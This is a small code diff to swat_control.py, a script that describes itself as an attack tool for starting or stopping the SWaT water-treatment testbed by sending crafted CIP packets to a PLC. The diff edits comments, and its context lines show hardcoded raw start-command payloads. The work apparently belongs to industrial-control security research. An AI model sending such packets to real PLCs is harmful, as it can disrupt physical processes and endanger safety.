@@ -3,7 +3,8 @@ swat_control.py
 An attack script that can control the start or stop the SWaT Plant via sending
 specially crafted packets to the PLC which are connected to other PLCs,
 in this case PLC1 which will determine the state of other PLCs.
-Made with help using scapy-cip-enip dissector to craft some of the packets:
+Made with help using cip.py and enip_tcp.py from scapy-cip-enip dissector
+to craft and dissect the packets:
 https://github.com/scy-phy/scapy-cip-enip
 
 Author: Goh Yee Kit
@@ -213,7 +214,7 @@ class PLCClient(object):
 
 def get_raw_pkts():
     '''
-    Returns a dictionary of RAW CIP packets
+    Returns a dictionary of RAW CIP packets in hex form
     '''
     start_payload1 = binascii.unhexlify('4d04206b2500c0b32801c1000100ff')
     start_payload2 = binascii.unhexlify('4d04206b2500c0b32801c100010000')
